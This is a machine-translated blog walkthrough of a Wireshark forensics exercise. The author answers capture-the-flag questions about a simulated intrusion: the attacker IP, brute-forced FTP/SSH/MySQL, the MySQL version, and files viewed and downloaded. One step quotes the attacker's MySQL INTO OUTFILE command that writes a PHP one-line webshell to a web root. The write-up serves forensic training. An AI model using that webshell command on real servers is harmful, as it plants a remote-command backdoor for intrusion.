# Wireshark packet title analysis

Packet analyzer, also known as sniffing (Sniffers), is a means of network traffic data analysis, commonly used in the field of network security use, but also used in the field of business analysis, generally refers to the use of sniffers on the data stream of data interception and packet analysis (Packet analysis).

 - Analyzing network problems
 - Business analysis
 - Analyzing network information flow
 - Network Big Data Financial Risk Control
 - Detecting attacks that attempt to penetrate the network
 - Detecting misuse of network resources by internal and external users
 - Detecting the effects of network intrusion
 - Monitor linked Internet broadband traffic
 - Monitoring network usage traffic (including internal users, external users and systems)
 - Monitoring the security status of the Internet and user computers
 - Penetration and Spoofing

**The above is extracted from Baidu**
**The packet is simulated by myself, now it has been uploaded to csdn Anyone who is interested can download it and do it. **
We mainly use the case packet in this chapter to analyze to find out the key data, now let's look at the following case requirements.


1, a company's network system is abnormal, guessing that there may be hackers on the company's servers to implement a series of scans and attacks, the use of Wireshark packet capture and analysis software to view and analyze the PC20201 server C:\Users\Public\Documents path under the dump.pcapng packet file to find the hacker's IP address, and the hacker's IP address as a Flag. Submit the hacker's IP address as a Flag value (e.g., 172.16.1.1);
! [insert image description here](https://img-blog.csdnimg.cn/20200119113708308.png)
We can see from this section of the packet, 192.168.52.132 to 192.168.52.139 to request access to port 22 (ssh service), usually the server will not take the initiative to communicate with the target, so we judge the hacker ip address for 192.168.52.132.

2. Continue to analyze the packet file dump.pcapng to analyze the hacker through the tool on the target server which services for the password violence enumeration penetration test, the service corresponding to the port in accordance with the order from small to large sequential arrangement as Flag value (such as: 77/88/99/166/1888) to submit; 
! [Insert image description here](https://img-blog.csdnimg.cn/20200119114604373.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10, text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyODA0Nzg5,size_16,color_FFFFFF,t_70)
! [Insert description of image here](https://img-blog.csdnimg.cn/20200119114604656.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10, text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyODA0Nzg5,size_16,color_FFFFFF,t_70)
! [Insert description of image here](https://img-blog.csdnimg.cn/20200119114616597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10, text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyODA0Nzg5,size_16,color_FFFFFF,t_70)
From the above three images we can see that the hacker has requested port 21,22,3306 respectively. Therefore, the hacker scanned port 21/22/3306, may be small partners will be curious about not there is a port 20? Here port 20 is also ftp service, but different from port 21, his role is to transfer data (port 21 is used to control user authentication, connection establishment and closure). About port 20 we will explain in detail below.

3. Continue to analyze the packet file dump.pcapng to find out the hacker has obtained the basic information of the target server, please submit the host name of the target server obtained by the hacker as a Flag value; 
! [Insert image description here](https://img-blog.csdnimg.cn/2020011911521883.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text _aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyODA0Nzg5,size_16,color_FFFFFF,t_70)
After filtering nbns packets, we can trace the udp data stream to get the host name metasploit, WINS server parsing (NBNS packets), WINS server is used to register the correspondence between the NetBIOS name and IP address of the record computer for querying by LAN computers. May use the tool nbtscan for scanning.

4. Hacker scanning may be directly on the target server of a service to implement the attack, continue to view the packet file dump.pcapng analyze the hacker successfully cracked the password of which service, and the version number of the service as a Flag value (such as: 5.1.10) to submit; 
! [insert image description here](https://img-blog.csdnimg.cn/20200119115534365.png)
View the packet, found that mysql service successfully logged in and behind the packet can be directly viewed version, can get the service version 5.1.73

5, continue to analyze the packet file dump.pcapng, the hacker wrote a Trojan horse through the database, will write the name of the Trojan horse as Flag value submission (the name does not contain a suffix); 
! [Insert picture description here](https://img-blog.csdnimg.cn/20200119115606882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10, text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyODA0Nzg5,size_16,color_FFFFFF,t_70)
Viewing the commands executed in the mysql packet, the hacker uploaded a one-sentence Trojan horse to the server's website after successfully logging in to the mysql database, with the file name test.php.
The hacker executed the command:select '<?php system($_GET[cmd]);? >' into outfile '/var/www/html/test.php'

6, continue to analyze the packet file dump.pcapng, the hacker wrote the Trojan horse through the database, the hacker wrote a sentence Trojan horse connection password as a Flag value submitted;

We have already got the command executed by the hacker in the previous step, so we can get the sentence Trojan's connection password as cmd.


7, continue to analyze the packet file dump.pcapng, to find out what files the hacker connected to a sentence Trojan horse viewed, the hacker viewed the name of the file as a Flag value to submit;

! [insert image description here](https://img-blog.csdnimg.cn/20200119115957711.png)
filter http packets, you can see the hacker using a sentence of Trojan horse to view the file name, as flag.txt

8, continue to analyze the packet file dump.pcapng, the hacker may find anomalous users and then again on the target server of a service password violence enumeration infiltration, successfully cracked out the password of the service logged in to the server to download a picture of the picture file in English words as Flag value submitted.

The English words in the image file were submitted as the Flag value. [Insert image description here](https://img-blog.csdnimg.cn/20200119120123434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10, text_aHR0cHM6) text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyODA0Nzg5,size_16,color_FFFFFF,t_70)
! [Insert description of image here](https://img-blog.csdnimg.cn/20200119120135497.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10, text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyODA0Nzg5,size_16,color_FFFFFF,t_70)
Directly filter ftp-data packets, track tcp streams, display and save the data as raw data and then save as export save as image format,, you can know the content of the downloaded image as hello,world!
** here on the ftp-data to explain, ftp-data is mainly the user to transfer data corresponding to the port of 20, so port 20 is also known as the FTP service data port. **

New Year's last update, after the year update will not be regularly updated, because there are more things need to travel often.
The direction of the post-new year update will probably be biased towards code auditing more a little bit, after the year I will put my energy into the study of code auditing, before playing the game I penetrated the host after the web source code code auditing database passwords and web site there are logical loopholes in the end of the bull wave, which also allows me to understand the importance of code auditing, so I will go to the depth of this piece of research, right.

Finally, I wish you all a happy new year!